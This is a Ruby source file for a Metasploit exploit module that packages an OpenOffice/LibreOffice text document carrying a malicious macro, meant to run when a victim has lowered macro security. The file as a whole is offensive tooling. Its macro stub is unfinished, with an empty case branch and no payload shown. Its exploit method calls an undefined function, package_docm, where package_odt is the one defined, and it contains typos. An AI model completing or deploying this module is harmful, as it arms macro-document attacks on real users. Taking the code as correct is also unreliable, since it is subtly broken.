##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/zip'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::EXE

  WINDOWSGUI = 'windows'
  OSXGUI     = 'osx'
  LINUXGUI   = 'linux'

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Apache OpenOffice Text Document Malicious Macro Execution",
      'Description'    => %q{
        This module generates an Apache OpenOffice Text Document with a malicious macro in it.
        For exploit successfully, the targeted user must adjust the security level in Macro
        Security to either Medium or Low. If set to Medium, a prompt is presented to the user
        to enable or disable the macro. If set to Low, the macro can automatically run without
        any warning.

        The module also works against LibreOffice.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'sinn3r' # Metasploit
        ],
      'References'     =>
        [
          ['URL', 'https://en.wikipedia.org/wiki/Macro_virus']
        ],
      'DefaultOptions'  =>
        {
          'EXITFUNC' => 'thread',
          'DisablePayloadHandler' => true
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Apache OpenOffice', {}]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Jan 10 2017",
      'DefaultTarget'  => 0
    ))

    register_options([
      OptString.new("BODY", [false, 'The message for the document body', '']),
      OptString.new('FILENAME', [true, 'The OpoenOffice Text document name', 'msf.odt'])
    ], self.class)
  end


  def macro_code
    %Q|
    function GetOS() as string
      select case getGUIType
        case 1:
          GetOS = "#{WINDOWSGUI}"
        case 3:
          GetOS = "#{OSXGUI}"
        case 4:
          GetOS = "#{LINUXGUI}"
        case
      end select
    end function
    |
  end

  def on_file_read(short_fname, full_fname)
    buf = File.read(full_fname)

    case short_fname
    when /content\.xml/
      buf.gsub!(/DOCBODYGOESHER/, datastore['BODY'])
    when /Module1\.xml/
      buf.gsub!(/CODEGOESHERE/, macro_code)
    end

    yield short_fname, buf
  end


  def package_odt(path)
    zip = Rex::Zip::Archive.new

    Dir["#{path}/**/**"].each do |file|
      p = file.sub(path+'/','')

      if File.directory?(file)
        print_status("Packaging directory: #{file}")
        zip.add_file(p)
      else
        on_file_read(p, file) do |fname, buf|
          print_status("Packaging file: #{fname}")
          zip.add_file(fname, buf)
        end
      end
    end

    zip.pack
  end


  def exploit
    print_status('Generating our odt file...')
    path  = File.join(Msf::Config.install_root, 'data', 'exploits', 'openoffice_document_macro')
    docm = package_docm(path)
    file_create(docm)
    super
  end

end
